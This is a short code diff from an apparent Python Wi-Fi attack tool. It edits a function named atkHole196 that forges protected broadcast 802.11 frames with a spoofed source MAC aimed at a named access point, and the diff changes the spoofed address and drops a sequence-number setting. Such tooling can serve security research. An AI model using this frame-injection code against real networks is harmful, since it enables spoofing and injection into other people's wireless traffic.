@@ -48,7 +48,7 @@ def atkHole196(pcapPath:str, pwd:str):
 
     
     bssAddr ='3C:A3:15:06:70:02' # FreeZio.2.4
-    srcAddr = '50:77:05:96:30:0b' # Pseudo MAC
+    srcAddr = '12:34:56:78:90:12' # Pseudo MAC
     dstAddr = 'FF:FF:FF:FF:FF:FF'
 
     bssMAC ='3C:A3:15:06:70:0b' # FreeZio.2.4    
@@ -82,7 +82,7 @@ def atkHole196(pcapPath:str, pwd:str):
         
         #encFrame.FCfield = "to-DS"
         encFrame.FCfield = "from-DS"
-        encFrame.SC=produce_sc(0, 5)
+        #encFrame.SC=produce_sc(0, 5) # 없어도 동작함.
         
         encFrame.FCfield |= Dot11(FCfield="protected").FCfield
         encFrame.PN0, encFrame.PN1, encFrame.PN2, encFrame.PN3, encFrame.PN4, encFrame.PN5 = pn2bytes(pn)
